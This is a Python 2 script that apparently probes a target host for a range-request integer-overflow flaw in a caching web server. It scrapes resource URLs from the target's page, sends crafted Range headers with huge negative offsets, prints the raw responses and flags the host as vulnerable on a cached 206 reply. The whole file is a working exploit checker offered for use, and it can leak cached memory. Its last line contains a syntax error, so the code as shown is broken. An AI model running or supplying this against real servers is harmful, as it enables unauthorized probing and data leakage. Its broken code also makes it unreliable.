# -*- coding=utf-8 -*-
 
import urllib2
import re
import urlparse
import HTMLParser
import ssl
import sys
 
try:
    _create_unverified_https_context = ssl._create_unverified_context  # Ignore certificate error
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context
 
def get_url(target):
    url_list = []
    if ':443' in target or ':8443' in target:
        url = 'https://' + target
    else:
        url = 'http://' + target
    res = urllib2.urlopen(url, timeout=30)
    html = res.read()
    root_url = res.geturl()
    m = re.findall("<(?:img|link|script)[^>]*?(?:src|href)=('|\")(.*?)\\1", html, re.I)
    if m:
        for _ in m:
            ParseResult = urlparse.urlparse(_[1])
            if ParseResult.netloc and ParseResult.scheme:
                if target == ParseResult.hostname:
                    url_list.append(HTMLParser.HTMLParser().unescape(_[1]))
            elif not ParseResult.netloc and not ParseResult.scheme:
                url_list.append(HTMLParser.HTMLParser().unescape(urlparse.urljoin(root_url, _[1])))
    return list(set(url_list))
 
 
def check(target):
    url_list = get_url(target)
    # url_list[0] = 'http://192.168.6.158/img/bd_logo1.png'
    # print url_list
    info = '[-]No risk detected'
    i = 0
    for url in url_list:
        if i >= 3: break
        i += 1
        l = 550
        while l < 700:
 
            headers = urllib2.urlopen(url,timeout=30).headers
            file_len = headers["Content-Length"]
            request = urllib2.Request(url)
            request.add_header("Range", "bytes=-%d,-9223372036854%d"%(int(file_len)+l,776000-(int(file_len)+l)))
            cacheres = urllib2.urlopen(request, timeout=30)
            cont = cacheres.read(4048)
            print cont
            # print str(cacheres.headers)
            if cacheres.code == 206 and "Content-Range" in cont and ": HIT" in str(cacheres.headers):
                info = "[+]Target vulnerability!"
                return info
            else:
                l += 50
    return info
 
def main():
    if len(sys.argv) != 2:
        print 'Usage: python %s ip:port(default 80)' % sys.argv[0]
    else:
        target = sys.argv[1]
        if ':' not in target:
            target = target + ':80'
        try:
            print check(target)
        except Exception,e:
            print '[-]Error: ' + str(e)
            exit(0)
 
if __name__=='__main__'::
    main()